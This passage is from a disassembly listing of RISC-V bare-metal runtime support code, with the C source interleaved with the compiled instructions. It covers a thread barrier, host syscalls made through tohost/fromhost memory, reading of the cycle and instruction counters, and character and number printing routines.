    800018bc:	0001a797          	auipc	a5,0x1a
    800018c0:	be878793          	addi	a5,a5,-1048 # 8001b4a4 <sense.2895>
    800018c4:	c398                	sw	a4,0(a5)
    800018c6:	a829                	j	800018e0 <barrier+0x7e>
  }
  else while(sense != threadsense)
    800018c8:	0001                	nop
    800018ca:	0001a797          	auipc	a5,0x1a
    800018ce:	bda78793          	addi	a5,a5,-1062 # 8001b4a4 <sense.2895>
    800018d2:	439c                	lw	a5,0(a5)
    800018d4:	0007871b          	sext.w	a4,a5
    800018d8:	00022783          	lw	a5,0(tp) # 0 <_tdata_begin>
    800018dc:	fef717e3          	bne	a4,a5,800018ca <barrier+0x68>
    ;

  __sync_synchronize();
    800018e0:	0ff0000f          	fence
}
    800018e4:	0001                	nop
    800018e6:	6462                	ld	s0,24(sp)
    800018e8:	6105                	addi	sp,sp,32
    800018ea:	8082                	ret

00000000800018ec <lfsr>:

static uint64_t lfsr(uint64_t x)
{
    800018ec:	7179                	addi	sp,sp,-48
    800018ee:	f422                	sd	s0,40(sp)
    800018f0:	1800                	addi	s0,sp,48
    800018f2:	fca43c23          	sd	a0,-40(s0)
  uint64_t bit = (x ^ (x >> 1)) & 1;
    800018f6:	fd843783          	ld	a5,-40(s0)
    800018fa:	0017d713          	srli	a4,a5,0x1
    800018fe:	fd843783          	ld	a5,-40(s0)
    80001902:	8fb9                	xor	a5,a5,a4
    80001904:	8b85                	andi	a5,a5,1
    80001906:	fef43423          	sd	a5,-24(s0)
  return (x >> 1) | (bit << 62);
    8000190a:	fd843783          	ld	a5,-40(s0)
    8000190e:	0017d713          	srli	a4,a5,0x1
    80001912:	fe843783          	ld	a5,-24(s0)
    80001916:	17fa                	slli	a5,a5,0x3e
    80001918:	8fd9                	or	a5,a5,a4
}
    8000191a:	853e                	mv	a0,a5
    8000191c:	7422                	ld	s0,40(sp)
    8000191e:	6145                	addi	sp,sp,48
    80001920:	8082                	ret

0000000080001922 <syscall>:

extern volatile uint64_t tohost;
extern volatile uint64_t fromhost;

static uintptr_t syscall(uintptr_t which, uint64_t arg0, uint64_t arg1, uint64_t arg2)
{
    80001922:	7171                	addi	sp,sp,-176
    80001924:	f522                	sd	s0,168(sp)
    80001926:	1900                	addi	s0,sp,176
    80001928:	f6a43c23          	sd	a0,-136(s0)
    8000192c:	f6b43823          	sd	a1,-144(s0)
    80001930:	f6c43423          	sd	a2,-152(s0)
    80001934:	f6d43023          	sd	a3,-160(s0)
    80001938:	ff040793          	addi	a5,s0,-16
    8000193c:	f4f43c23          	sd	a5,-168(s0)
    80001940:	f5843783          	ld	a5,-168(s0)
    80001944:	f9078793          	addi	a5,a5,-112
    80001948:	03f78793          	addi	a5,a5,63
    8000194c:	8399                	srli	a5,a5,0x6
    8000194e:	079a                	slli	a5,a5,0x6
  volatile uint64_t magic_mem[8] __attribute__((aligned(64)));
  magic_mem[0] = which;
    80001950:	f7843703          	ld	a4,-136(s0)
    80001954:	e398                	sd	a4,0(a5)
  magic_mem[1] = arg0;
    80001956:	f7043703          	ld	a4,-144(s0)
    8000195a:	e798                	sd	a4,8(a5)
  magic_mem[2] = arg1;
    8000195c:	f6843703          	ld	a4,-152(s0)
    80001960:	eb98                	sd	a4,16(a5)
  magic_mem[3] = arg2;
    80001962:	f6043703          	ld	a4,-160(s0)
    80001966:	ef98                	sd	a4,24(a5)
  __sync_synchronize();
    80001968:	0ff0000f          	fence

  tohost = (uintptr_t)magic_mem;
    8000196c:	86be                	mv	a3,a5
    8000196e:	fffff717          	auipc	a4,0xfffff
    80001972:	69270713          	addi	a4,a4,1682 # 80001000 <tohost>
    80001976:	e314                	sd	a3,0(a4)
  while (fromhost == 0)
    80001978:	0001                	nop
    8000197a:	fffff717          	auipc	a4,0xfffff
    8000197e:	6c670713          	addi	a4,a4,1734 # 80001040 <fromhost>
    80001982:	6318                	ld	a4,0(a4)
    80001984:	db7d                	beqz	a4,8000197a <syscall+0x58>
    ;
  fromhost = 0;
    80001986:	fffff717          	auipc	a4,0xfffff
    8000198a:	6ba70713          	addi	a4,a4,1722 # 80001040 <fromhost>
    8000198e:	00073023          	sd	zero,0(a4)

  __sync_synchronize();
    80001992:	0ff0000f          	fence
  return magic_mem[0];
    80001996:	639c                	ld	a5,0(a5)
}
    80001998:	853e                	mv	a0,a5
    8000199a:	742a                	ld	s0,168(sp)
    8000199c:	614d                	addi	sp,sp,176
    8000199e:	8082                	ret

00000000800019a0 <setStats>:
#define NUM_COUNTERS 2
static uintptr_t counters[NUM_COUNTERS];
static char* counter_names[NUM_COUNTERS];

void setStats(int enable)
{
    800019a0:	715d                	addi	sp,sp,-80
    800019a2:	e4a2                	sd	s0,72(sp)
    800019a4:	0880                	addi	s0,sp,80
    800019a6:	87aa                	mv	a5,a0
    800019a8:	faf42e23          	sw	a5,-68(s0)
  int i = 0;
    800019ac:	fc042e23          	sw	zero,-36(s0)
    uintptr_t csr = read_csr(name); \
    if (!enable) { csr -= counters[i]; counter_names[i] = #name; } \
    counters[i++] = csr; \
  } while (0)

  READ_CTR(mcycle);
    800019b0:	fdc42783          	lw	a5,-36(s0)
    800019b4:	0007871b          	sext.w	a4,a5
    800019b8:	4785                	li	a5,1
    800019ba:	fee7cbe3          	blt	a5,a4,800019b0 <setStats+0x10>
    800019be:	b00027f3          	csrr	a5,mcycle
    800019c2:	fcf43823          	sd	a5,-48(s0)
    800019c6:	fd043783          	ld	a5,-48(s0)
    800019ca:	fef43423          	sd	a5,-24(s0)
    800019ce:	fbc42783          	lw	a5,-68(s0)
    800019d2:	2781                	sext.w	a5,a5
    800019d4:	ef8d                	bnez	a5,80001a0e <setStats+0x6e>
    800019d6:	0001a717          	auipc	a4,0x1a
    800019da:	aaa70713          	addi	a4,a4,-1366 # 8001b480 <counters>
    800019de:	fdc42783          	lw	a5,-36(s0)
    800019e2:	078e                	slli	a5,a5,0x3
    800019e4:	97ba                	add	a5,a5,a4
    800019e6:	639c                	ld	a5,0(a5)
    800019e8:	fe843703          	ld	a4,-24(s0)
    800019ec:	40f707b3          	sub	a5,a4,a5
    800019f0:	fef43423          	sd	a5,-24(s0)
    800019f4:	0001a717          	auipc	a4,0x1a
    800019f8:	a9c70713          	addi	a4,a4,-1380 # 8001b490 <counter_names>
    800019fc:	fdc42783          	lw	a5,-36(s0)
    80001a00:	078e                	slli	a5,a5,0x3
    80001a02:	97ba                	add	a5,a5,a4
    80001a04:	00001717          	auipc	a4,0x1
    80001a08:	f7470713          	addi	a4,a4,-140 # 80002978 <atol+0x242>
    80001a0c:	e398                	sd	a4,0(a5)
    80001a0e:	fdc42783          	lw	a5,-36(s0)
    80001a12:	0017871b          	addiw	a4,a5,1
    80001a16:	fce42e23          	sw	a4,-36(s0)
    80001a1a:	0001a717          	auipc	a4,0x1a
    80001a1e:	a6670713          	addi	a4,a4,-1434 # 8001b480 <counters>
    80001a22:	078e                	slli	a5,a5,0x3
    80001a24:	97ba                	add	a5,a5,a4
    80001a26:	fe843703          	ld	a4,-24(s0)
    80001a2a:	e398                	sd	a4,0(a5)
  READ_CTR(minstret);
    80001a2c:	fdc42783          	lw	a5,-36(s0)
    80001a30:	0007871b          	sext.w	a4,a5
    80001a34:	4785                	li	a5,1
    80001a36:	fee7cbe3          	blt	a5,a4,80001a2c <setStats+0x8c>
    80001a3a:	b02027f3          	csrr	a5,minstret
    80001a3e:	fcf43423          	sd	a5,-56(s0)
    80001a42:	fc843783          	ld	a5,-56(s0)
    80001a46:	fef43023          	sd	a5,-32(s0)
    80001a4a:	fbc42783          	lw	a5,-68(s0)
    80001a4e:	2781                	sext.w	a5,a5
    80001a50:	ef8d                	bnez	a5,80001a8a <setStats+0xea>
    80001a52:	0001a717          	auipc	a4,0x1a
    80001a56:	a2e70713          	addi	a4,a4,-1490 # 8001b480 <counters>
    80001a5a:	fdc42783          	lw	a5,-36(s0)
    80001a5e:	078e                	slli	a5,a5,0x3
    80001a60:	97ba                	add	a5,a5,a4
    80001a62:	639c                	ld	a5,0(a5)
    80001a64:	fe043703          	ld	a4,-32(s0)
    80001a68:	40f707b3          	sub	a5,a4,a5
    80001a6c:	fef43023          	sd	a5,-32(s0)
    80001a70:	0001a717          	auipc	a4,0x1a
    80001a74:	a2070713          	addi	a4,a4,-1504 # 8001b490 <counter_names>
    80001a78:	fdc42783          	lw	a5,-36(s0)
    80001a7c:	078e                	slli	a5,a5,0x3
    80001a7e:	97ba                	add	a5,a5,a4
    80001a80:	00001717          	auipc	a4,0x1
    80001a84:	f0070713          	addi	a4,a4,-256 # 80002980 <atol+0x24a>
    80001a88:	e398                	sd	a4,0(a5)
    80001a8a:	fdc42783          	lw	a5,-36(s0)
    80001a8e:	0017871b          	addiw	a4,a5,1
    80001a92:	fce42e23          	sw	a4,-36(s0)
    80001a96:	0001a717          	auipc	a4,0x1a
    80001a9a:	9ea70713          	addi	a4,a4,-1558 # 8001b480 <counters>
    80001a9e:	078e                	slli	a5,a5,0x3
    80001aa0:	97ba                	add	a5,a5,a4
    80001aa2:	fe043703          	ld	a4,-32(s0)
    80001aa6:	e398                	sd	a4,0(a5)

#undef READ_CTR
}
    80001aa8:	0001                	nop
    80001aaa:	6426                	ld	s0,72(sp)
    80001aac:	6161                	addi	sp,sp,80
    80001aae:	8082                	ret

0000000080001ab0 <tohost_exit>:

void __attribute__((noreturn)) tohost_exit(uintptr_t code)
{
    80001ab0:	1101                	addi	sp,sp,-32
    80001ab2:	ec22                	sd	s0,24(sp)
    80001ab4:	1000                	addi	s0,sp,32
    80001ab6:	fea43423          	sd	a0,-24(s0)
  tohost = (code << 1) | 1;
    80001aba:	fe843783          	ld	a5,-24(s0)
    80001abe:	0786                	slli	a5,a5,0x1
    80001ac0:	0017e713          	ori	a4,a5,1
    80001ac4:	fffff797          	auipc	a5,0xfffff
    80001ac8:	53c78793          	addi	a5,a5,1340 # 80001000 <tohost>
    80001acc:	e398                	sd	a4,0(a5)
  while (1);
    80001ace:	a001                	j	80001ace <tohost_exit+0x1e>

0000000080001ad0 <handle_trap>:
}

uintptr_t __attribute__((weak)) handle_trap(uintptr_t cause, uintptr_t epc, uintptr_t regs[32])
{
    80001ad0:	7179                	addi	sp,sp,-48
    80001ad2:	f406                	sd	ra,40(sp)
    80001ad4:	f022                	sd	s0,32(sp)
    80001ad6:	1800                	addi	s0,sp,48
    80001ad8:	fea43423          	sd	a0,-24(s0)
    80001adc:	feb43023          	sd	a1,-32(s0)
    80001ae0:	fcc43c23          	sd	a2,-40(s0)
  tohost_exit(1337);
    80001ae4:	53900513          	li	a0,1337
    80001ae8:	fc9ff0ef          	jal	ra,80001ab0 <tohost_exit>

0000000080001aec <exit>:
}

void exit(int code)
{
    80001aec:	1101                	addi	sp,sp,-32
    80001aee:	ec06                	sd	ra,24(sp)
    80001af0:	e822                	sd	s0,16(sp)
    80001af2:	1000                	addi	s0,sp,32
    80001af4:	87aa                	mv	a5,a0
    80001af6:	fef42623          	sw	a5,-20(s0)
  tohost_exit(code);
    80001afa:	fec42783          	lw	a5,-20(s0)
    80001afe:	853e                	mv	a0,a5
    80001b00:	fb1ff0ef          	jal	ra,80001ab0 <tohost_exit>

0000000080001b04 <abort>:
}

void abort()
{
    80001b04:	1141                	addi	sp,sp,-16
    80001b06:	e406                	sd	ra,8(sp)
    80001b08:	e022                	sd	s0,0(sp)
    80001b0a:	0800                	addi	s0,sp,16
  exit(128 + SIGABRT);
    80001b0c:	08600513          	li	a0,134
    80001b10:	fddff0ef          	jal	ra,80001aec <exit>

0000000080001b14 <printstr>:
}

void printstr(const char* s)
{
    80001b14:	7179                	addi	sp,sp,-48
    80001b16:	f406                	sd	ra,40(sp)
    80001b18:	f022                	sd	s0,32(sp)
    80001b1a:	ec26                	sd	s1,24(sp)
    80001b1c:	1800                	addi	s0,sp,48
    80001b1e:	fca43c23          	sd	a0,-40(s0)
  syscall(SYS_write, 1, (uintptr_t)s, strlen(s));
    80001b22:	fd843483          	ld	s1,-40(s0)
    80001b26:	fd843503          	ld	a0,-40(s0)
    80001b2a:	2c9000ef          	jal	ra,800025f2 <strlen>
    80001b2e:	87aa                	mv	a5,a0
    80001b30:	86be                	mv	a3,a5
    80001b32:	8626                	mv	a2,s1
    80001b34:	4585                	li	a1,1
    80001b36:	04000513          	li	a0,64
    80001b3a:	de9ff0ef          	jal	ra,80001922 <syscall>
}
    80001b3e:	0001                	nop
    80001b40:	70a2                	ld	ra,40(sp)
    80001b42:	7402                	ld	s0,32(sp)
    80001b44:	64e2                	ld	s1,24(sp)
    80001b46:	6145                	addi	sp,sp,48
    80001b48:	8082                	ret

0000000080001b4a <thread_entry>:

void __attribute__((weak)) thread_entry(int cid, int nc)
{
    80001b4a:	1101                	addi	sp,sp,-32
    80001b4c:	ec22                	sd	s0,24(sp)
    80001b4e:	1000                	addi	s0,sp,32
    80001b50:	87aa                	mv	a5,a0
    80001b52:	872e                	mv	a4,a1
    80001b54:	fef42623          	sw	a5,-20(s0)
    80001b58:	87ba                	mv	a5,a4
    80001b5a:	fef42423          	sw	a5,-24(s0)
  // multi-threaded programs override this function.
  // for the case of single-threaded programs, only let core 0 proceed.
  while (cid != 0);
    80001b5e:	fec42783          	lw	a5,-20(s0)
    80001b62:	2781                	sext.w	a5,a5
    80001b64:	ffed                	bnez	a5,80001b5e <thread_entry+0x14>
}
    80001b66:	0001                	nop
    80001b68:	0001                	nop
    80001b6a:	6462                	ld	s0,24(sp)
    80001b6c:	6105                	addi	sp,sp,32
    80001b6e:	8082                	ret

int __attribute__((weak)) main(int argc, char** argv)
{
    80001b70:	1101                	addi	sp,sp,-32
    80001b72:	ec06                	sd	ra,24(sp)
    80001b74:	e822                	sd	s0,16(sp)
    80001b76:	1000                	addi	s0,sp,32
    80001b78:	87aa                	mv	a5,a0
    80001b7a:	feb43023          	sd	a1,-32(s0)
    80001b7e:	fef42623          	sw	a5,-20(s0)
  // single-threaded programs override this function.
  printstr("Implement main(), foo!\n");
    80001b82:	00001517          	auipc	a0,0x1
    80001b86:	e0e50513          	addi	a0,a0,-498 # 80002990 <atol+0x25a>
    80001b8a:	f8bff0ef          	jal	ra,80001b14 <printstr>
  return -1;
    80001b8e:	57fd                	li	a5,-1
}
    80001b90:	853e                	mv	a0,a5
    80001b92:	60e2                	ld	ra,24(sp)
    80001b94:	6442                	ld	s0,16(sp)
    80001b96:	6105                	addi	sp,sp,32
    80001b98:	8082                	ret

0000000080001b9a <init_tls>:

static void init_tls()
{
    80001b9a:	1101                	addi	sp,sp,-32
    80001b9c:	ec06                	sd	ra,24(sp)
    80001b9e:	e822                	sd	s0,16(sp)
    80001ba0:	1000                	addi	s0,sp,32
  register void* thread_pointer asm("tp");
  extern char _tls_data;
  extern __thread char _tdata_begin, _tdata_end, _tbss_end;
  size_t tdata_size = &_tdata_end - &_tdata_begin;
    80001ba2:	00020713          	mv	a4,tp
    80001ba6:	00020793          	mv	a5,tp
    80001baa:	40f707b3          	sub	a5,a4,a5
    80001bae:	fef43423          	sd	a5,-24(s0)
  memcpy(thread_pointer, &_tls_data, tdata_size);
    80001bb2:	8792                	mv	a5,tp
    80001bb4:	fe843603          	ld	a2,-24(s0)
    80001bb8:	0001a597          	auipc	a1,0x1a
    80001bbc:	90858593          	addi	a1,a1,-1784 # 8001b4c0 <_end>
    80001bc0:	853e                	mv	a0,a5
    80001bc2:	0ab000ef          	jal	ra,8000246c <memcpy>
  size_t tbss_size = &_tbss_end - &_tdata_end;
    80001bc6:	08420713          	addi	a4,tp,132 # 84 <_tbss_end>
    80001bca:	00020793          	mv	a5,tp
    80001bce:	40f707b3          	sub	a5,a4,a5
    80001bd2:	fef43023          	sd	a5,-32(s0)
  memset(thread_pointer + tdata_size, 0, tbss_size);
    80001bd6:	8712                	mv	a4,tp
    80001bd8:	fe843783          	ld	a5,-24(s0)
    80001bdc:	97ba                	add	a5,a5,a4
    80001bde:	fe043603          	ld	a2,-32(s0)
    80001be2:	4581                	li	a1,0
    80001be4:	853e                	mv	a0,a5
    80001be6:	13f000ef          	jal	ra,80002524 <memset>
}
    80001bea:	0001                	nop
    80001bec:	60e2                	ld	ra,24(sp)
    80001bee:	6442                	ld	s0,16(sp)
    80001bf0:	6105                	addi	sp,sp,32
    80001bf2:	8082                	ret

0000000080001bf4 <_init>:

void _init(int cid, int nc)
{
    80001bf4:	7171                	addi	sp,sp,-176
    80001bf6:	f506                	sd	ra,168(sp)
    80001bf8:	f122                	sd	s0,160(sp)
    80001bfa:	ed26                	sd	s1,152(sp)
    80001bfc:	1900                	addi	s0,sp,176
    80001bfe:	87aa                	mv	a5,a0
    80001c00:	872e                	mv	a4,a1
    80001c02:	f4f42e23          	sw	a5,-164(s0)
    80001c06:	87ba                	mv	a5,a4
    80001c08:	f4f42c23          	sw	a5,-168(s0)
    80001c0c:	fe040793          	addi	a5,s0,-32
    80001c10:	f4f43823          	sd	a5,-176(s0)
    80001c14:	f5043783          	ld	a5,-176(s0)
    80001c18:	f8078793          	addi	a5,a5,-128
    80001c1c:	03f78793          	addi	a5,a5,63
    80001c20:	8399                	srli	a5,a5,0x6
    80001c22:	00679493          	slli	s1,a5,0x6
  init_tls();
    80001c26:	f75ff0ef          	jal	ra,80001b9a <init_tls>
  thread_entry(cid, nc);
    80001c2a:	f5842703          	lw	a4,-168(s0)
    80001c2e:	f5c42783          	lw	a5,-164(s0)
    80001c32:	85ba                	mv	a1,a4
    80001c34:	853e                	mv	a0,a5
    80001c36:	f15ff0ef          	jal	ra,80001b4a <thread_entry>

  // only single-threaded programs should ever get here.
  int ret = main(0, 0);
    80001c3a:	4581                	li	a1,0
    80001c3c:	4501                	li	a0,0
    80001c3e:	e7aff0ef          	jal	ra,800012b8 <main>
    80001c42:	87aa                	mv	a5,a0
    80001c44:	fcf42823          	sw	a5,-48(s0)

  char buf[NUM_COUNTERS * 32] __attribute__((aligned(64)));
  char* pbuf = buf;
    80001c48:	fc943c23          	sd	s1,-40(s0)
  for (int i = 0; i < NUM_COUNTERS; i++)
    80001c4c:	fc042a23          	sw	zero,-44(s0)
    80001c50:	a095                	j	80001cb4 <_init+0xc0>
    if (counters[i])
    80001c52:	0001a717          	auipc	a4,0x1a
    80001c56:	82e70713          	addi	a4,a4,-2002 # 8001b480 <counters>
    80001c5a:	fd442783          	lw	a5,-44(s0)
    80001c5e:	078e                	slli	a5,a5,0x3
    80001c60:	97ba                	add	a5,a5,a4
    80001c62:	639c                	ld	a5,0(a5)
    80001c64:	c3b9                	beqz	a5,80001caa <_init+0xb6>
      pbuf += sprintf(pbuf, "%s = %ld\n", counter_names[i], counters[i]);
    80001c66:	0001a717          	auipc	a4,0x1a
    80001c6a:	82a70713          	addi	a4,a4,-2006 # 8001b490 <counter_names>
    80001c6e:	fd442783          	lw	a5,-44(s0)
    80001c72:	078e                	slli	a5,a5,0x3
    80001c74:	97ba                	add	a5,a5,a4
    80001c76:	6390                	ld	a2,0(a5)
    80001c78:	0001a717          	auipc	a4,0x1a
    80001c7c:	80870713          	addi	a4,a4,-2040 # 8001b480 <counters>
    80001c80:	fd442783          	lw	a5,-44(s0)
    80001c84:	078e                	slli	a5,a5,0x3
    80001c86:	97ba                	add	a5,a5,a4
    80001c88:	639c                	ld	a5,0(a5)
    80001c8a:	86be                	mv	a3,a5
    80001c8c:	00001597          	auipc	a1,0x1
    80001c90:	d1c58593          	addi	a1,a1,-740 # 800029a8 <atol+0x272>
    80001c94:	fd843503          	ld	a0,-40(s0)
    80001c98:	712000ef          	jal	ra,800023aa <sprintf>
    80001c9c:	87aa                	mv	a5,a0
    80001c9e:	873e                	mv	a4,a5
    80001ca0:	fd843783          	ld	a5,-40(s0)
    80001ca4:	97ba                	add	a5,a5,a4
    80001ca6:	fcf43c23          	sd	a5,-40(s0)
  for (int i = 0; i < NUM_COUNTERS; i++)
    80001caa:	fd442783          	lw	a5,-44(s0)
    80001cae:	2785                	addiw	a5,a5,1
    80001cb0:	fcf42a23          	sw	a5,-44(s0)
    80001cb4:	fd442783          	lw	a5,-44(s0)
    80001cb8:	0007871b          	sext.w	a4,a5
    80001cbc:	4785                	li	a5,1
    80001cbe:	f8e7dae3          	bge	a5,a4,80001c52 <_init+0x5e>
  if (pbuf != buf)
    80001cc2:	fd843783          	ld	a5,-40(s0)
    80001cc6:	00f48563          	beq	s1,a5,80001cd0 <_init+0xdc>
    printstr(buf);
    80001cca:	8526                	mv	a0,s1
    80001ccc:	e49ff0ef          	jal	ra,80001b14 <printstr>

  exit(ret);
    80001cd0:	fd042783          	lw	a5,-48(s0)
    80001cd4:	853e                	mv	a0,a5
    80001cd6:	e17ff0ef          	jal	ra,80001aec <exit>

0000000080001cda <putchar>:
}

#undef putchar
int putchar(int ch)
{
    80001cda:	1101                	addi	sp,sp,-32
    80001cdc:	ec06                	sd	ra,24(sp)
    80001cde:	e822                	sd	s0,16(sp)
    80001ce0:	1000                	addi	s0,sp,32
    80001ce2:	87aa                	mv	a5,a0
    80001ce4:	fef42623          	sw	a5,-20(s0)
  static __thread char buf[64] __attribute__((aligned(64)));
  static __thread int buflen = 0;

  buf[buflen++] = ch;
    80001ce8:	08022783          	lw	a5,128(tp) # 80 <buflen.2991>
    80001cec:	0017871b          	addiw	a4,a5,1
    80001cf0:	0007069b          	sext.w	a3,a4
    80001cf4:	08d22023          	sw	a3,128(tp) # 80 <buflen.2991>
    80001cf8:	fec42703          	lw	a4,-20(s0)
    80001cfc:	0ff77713          	andi	a4,a4,255
    80001d00:	04020693          	addi	a3,tp,64 # 40 <buf.2990>
    80001d04:	97b6                	add	a5,a5,a3
    80001d06:	00e78023          	sb	a4,0(a5)

  if (ch == '\n' || buflen == sizeof(buf))
    80001d0a:	fec42783          	lw	a5,-20(s0)
    80001d0e:	0007871b          	sext.w	a4,a5
    80001d12:	47a9                	li	a5,10
    80001d14:	00f70963          	beq	a4,a5,80001d26 <putchar+0x4c>
    80001d18:	08022783          	lw	a5,128(tp) # 80 <buflen.2991>
    80001d1c:	873e                	mv	a4,a5
    80001d1e:	04000793          	li	a5,64
    80001d22:	00f71f63          	bne	a4,a5,80001d40 <putchar+0x66>
  {
    syscall(SYS_write, 1, (uintptr_t)buf, buflen);
    80001d26:	04020713          	addi	a4,tp,64 # 40 <buf.2990>
    80001d2a:	08022783          	lw	a5,128(tp) # 80 <buflen.2991>
    80001d2e:	86be                	mv	a3,a5
    80001d30:	863a                	mv	a2,a4
    80001d32:	4585                	li	a1,1
    80001d34:	04000513          	li	a0,64
    80001d38:	bebff0ef          	jal	ra,80001922 <syscall>
    buflen = 0;
    80001d3c:	08022023          	sw	zero,128(tp) # 80 <buflen.2991>
  }

  return 0;
    80001d40:	4781                	li	a5,0
}
    80001d42:	853e                	mv	a0,a5
    80001d44:	60e2                	ld	ra,24(sp)
    80001d46:	6442                	ld	s0,16(sp)
    80001d48:	6105                	addi	sp,sp,32
    80001d4a:	8082                	ret

0000000080001d4c <printhex>:

void printhex(uint64_t x)
{
    80001d4c:	7139                	addi	sp,sp,-64
    80001d4e:	fc06                	sd	ra,56(sp)
    80001d50:	f822                	sd	s0,48(sp)
    80001d52:	0080                	addi	s0,sp,64
    80001d54:	fca43423          	sd	a0,-56(s0)
  char str[17];
  int i;
  for (i = 0; i < 16; i++)
    80001d58:	fe042623          	sw	zero,-20(s0)
    80001d5c:	a8a1                	j	80001db4 <printhex+0x68>
  {
    str[15-i] = (x & 0xF) + ((x & 0xF) < 10 ? '0' : 'a'-10);
    80001d5e:	fc843783          	ld	a5,-56(s0)
    80001d62:	0ff7f793          	andi	a5,a5,255
    80001d66:	8bbd                	andi	a5,a5,15
    80001d68:	0ff7f713          	andi	a4,a5,255
    80001d6c:	fc843783          	ld	a5,-56(s0)
    80001d70:	00f7f693          	andi	a3,a5,15
    80001d74:	47a5                	li	a5,9
    80001d76:	00d7e563          	bltu	a5,a3,80001d80 <printhex+0x34>
    80001d7a:	03000793          	li	a5,48
    80001d7e:	a019                	j	80001d84 <printhex+0x38>
    80001d80:	05700793          	li	a5,87
    80001d84:	463d                	li	a2,15
    80001d86:	fec42683          	lw	a3,-20(s0)
    80001d8a:	40d606bb          	subw	a3,a2,a3
    80001d8e:	2681                	sext.w	a3,a3
    80001d90:	9fb9                	addw	a5,a5,a4
    80001d92:	0ff7f713          	andi	a4,a5,255
    80001d96:	ff040793          	addi	a5,s0,-16
    80001d9a:	97b6                	add	a5,a5,a3
    80001d9c:	fee78423          	sb	a4,-24(a5)
    x >>= 4;
    80001da0:	fc843783          	ld	a5,-56(s0)
    80001da4:	8391                	srli	a5,a5,0x4
    80001da6:	fcf43423          	sd	a5,-56(s0)
  for (i = 0; i < 16; i++)
    80001daa:	fec42783          	lw	a5,-20(s0)
    80001dae:	2785                	addiw	a5,a5,1
    80001db0:	fef42623          	sw	a5,-20(s0)
    80001db4:	fec42783          	lw	a5,-20(s0)
    80001db8:	0007871b          	sext.w	a4,a5
    80001dbc:	47bd                	li	a5,15
    80001dbe:	fae7d0e3          	bge	a5,a4,80001d5e <printhex+0x12>
  }
  str[16] = 0;
    80001dc2:	fe040423          	sb	zero,-24(s0)

  printstr(str);
    80001dc6:	fd840793          	addi	a5,s0,-40
    80001dca:	853e                	mv	a0,a5
    80001dcc:	d49ff0ef          	jal	ra,80001b14 <printstr>
}
    80001dd0:	0001                	nop
    80001dd2:	70e2                	ld	ra,56(sp)
    80001dd4:	7442                	ld	s0,48(sp)
    80001dd6:	6121                	addi	sp,sp,64
    80001dd8:	8082                	ret

0000000080001dda <printnum>:

static inline void printnum(void (*putch)(int, void**), void **putdat,
                    unsigned long long num, unsigned base, int width, int padc)
{
    80001dda:	714d                	addi	sp,sp,-336
    80001ddc:	e686                	sd	ra,328(sp)
    80001dde:	e2a2                	sd	s0,320(sp)
    80001de0:	0a80                	addi	s0,sp,336
    80001de2:	eca43c23          	sd	a0,-296(s0)
    80001de6:	ecb43823          	sd	a1,-304(s0)
    80001dea:	ecc43423          	sd	a2,-312(s0)
    80001dee:	8636                	mv	a2,a3
    80001df0:	86ba                	mv	a3,a4
    80001df2:	873e                	mv	a4,a5
    80001df4:	87b2                	mv	a5,a2
    80001df6:	ecf42223          	sw	a5,-316(s0)
    80001dfa:	87b6                	mv	a5,a3
    80001dfc:	ecf42023          	sw	a5,-320(s0)
    80001e00:	87ba                	mv	a5,a4
    80001e02:	eaf42e23          	sw	a5,-324(s0)
  unsigned digs[sizeof(num)*CHAR_BIT];
  int pos = 0;
    80001e06:	fe042623          	sw	zero,-20(s0)

  while (1)
  {
    digs[pos++] = num % base;
    80001e0a:	ec446783          	lwu	a5,-316(s0)
    80001e0e:	ec843703          	ld	a4,-312(s0)
    80001e12:	02f776b3          	remu	a3,a4,a5
    80001e16:	fec42783          	lw	a5,-20(s0)
    80001e1a:	0017871b          	addiw	a4,a5,1
    80001e1e:	fee42623          	sw	a4,-20(s0)
    80001e22:	0006871b          	sext.w	a4,a3
    80001e26:	078a                	slli	a5,a5,0x2
    80001e28:	ff040693          	addi	a3,s0,-16
    80001e2c:	97b6                	add	a5,a5,a3
    80001e2e:	eee7ac23          	sw	a4,-264(a5)
    if (num < base)
    80001e32:	ec446783          	lwu	a5,-316(s0)
    80001e36:	ec843703          	ld	a4,-312(s0)
    80001e3a:	00f76b63          	bltu	a4,a5,80001e50 <printnum+0x76>
      break;
    num /= base;
    80001e3e:	ec446783          	lwu	a5,-316(s0)
    80001e42:	ec843703          	ld	a4,-312(s0)
    80001e46:	02f757b3          	divu	a5,a4,a5
    80001e4a:	ecf43423          	sd	a5,-312(s0)
    digs[pos++] = num % base;
    80001e4e:	bf75                	j	80001e0a <printnum+0x30>
      break;
    80001e50:	0001                	nop
  }

  while (width-- > pos)
    80001e52:	a809                	j	80001e64 <printnum+0x8a>
    putch(padc, putdat);
    80001e54:	ebc42783          	lw	a5,-324(s0)
    80001e58:	ed843703          	ld	a4,-296(s0)
    80001e5c:	ed043583          	ld	a1,-304(s0)
    80001e60:	853e                	mv	a0,a5
    80001e62:	9702                	jalr	a4
  while (width-- > pos)
    80001e64:	ec042783          	lw	a5,-320(s0)
    80001e68:	fff7871b          	addiw	a4,a5,-1
    80001e6c:	ece42023          	sw	a4,-320(s0)
    80001e70:	fec42703          	lw	a4,-20(s0)
    80001e74:	2701                	sext.w	a4,a4
    80001e76:	fcf74fe3          	blt	a4,a5,80001e54 <printnum+0x7a>

  while (pos-- > 0)
    80001e7a:	a099                	j	80001ec0 <printnum+0xe6>
    putch(digs[pos] + (digs[pos] >= 10 ? 'a' - 10 : '0'), putdat);
    80001e7c:	fec42783          	lw	a5,-20(s0)
    80001e80:	078a                	slli	a5,a5,0x2
    80001e82:	ff040713          	addi	a4,s0,-16
    80001e86:	97ba                	add	a5,a5,a4
    80001e88:	ef87a703          	lw	a4,-264(a5)
    80001e8c:	fec42783          	lw	a5,-20(s0)
    80001e90:	078a                	slli	a5,a5,0x2
    80001e92:	ff040693          	addi	a3,s0,-16
    80001e96:	97b6                	add	a5,a5,a3
    80001e98:	ef87a783          	lw	a5,-264(a5)
    80001e9c:	86be                	mv	a3,a5
    80001e9e:	47a5                	li	a5,9
    80001ea0:	00d7f563          	bgeu	a5,a3,80001eaa <printnum+0xd0>
    80001ea4:	05700793          	li	a5,87
    80001ea8:	a019                	j	80001eae <printnum+0xd4>
    80001eaa:	03000793          	li	a5,48
    80001eae:	9fb9                	addw	a5,a5,a4
    80001eb0:	2781                	sext.w	a5,a5
    80001eb2:	2781                	sext.w	a5,a5
    80001eb4:	ed843703          	ld	a4,-296(s0)
    80001eb8:	ed043583          	ld	a1,-304(s0)
    80001ebc:	853e                	mv	a0,a5
    80001ebe:	9702                	jalr	a4
  while (pos-- > 0)
    80001ec0:	fec42783          	lw	a5,-20(s0)
